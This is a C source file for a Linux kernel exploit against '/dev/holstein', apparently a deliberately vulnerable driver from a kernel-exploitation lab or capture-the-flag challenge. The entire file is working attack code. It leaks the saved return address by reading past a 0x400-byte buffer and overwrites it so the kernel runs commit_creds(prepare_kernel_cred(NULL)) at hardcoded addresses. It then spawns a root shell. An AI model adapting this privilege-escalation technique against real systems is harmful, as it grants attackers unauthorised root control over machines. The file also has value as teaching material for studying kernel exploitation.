#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define dev_file "/dev/holstein"
#define BUFFER_SIZE 0x400
int global_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    if(global_fd<0)
        errExit("open dev file");
    log_info("Opened dev file");
}
char buffer[BUFFER_SIZE+0x20];
void dev_read()
{
    log_info("Reading...");
    read(global_fd,buffer,sizeof(buffer));
}
void dev_write(){
    log_info("Writting...");
    write(global_fd,buffer,sizeof(buffer));
}
char* (*prepare_kernel_cred)(char *) = (void *)0xffffffff8106e240;
void  (*commit_cred)(char *)         = (void *)0xffffffff8106e390;
void priv(){
    commit_cred(prepare_kernel_cred(NULL));
}
int main(int argc,char** argv,char **envp){
    memset(buffer,0,sizeof(buffer));
    save_state();
    open_dev();
    dev_read();
    int64_t* leak = (int64_t *)(buffer+0x400);
    log_info("Saved $rbp = 0x%lx",leak[0]);
    log_info("Saved $rip = 0x%lx",leak[1]);
    int64_t saved_rip = leak[1];
    leak[1] = (int64_t)priv;
    leak[2] = saved_rip;
    dev_write();
    get_shell();
};
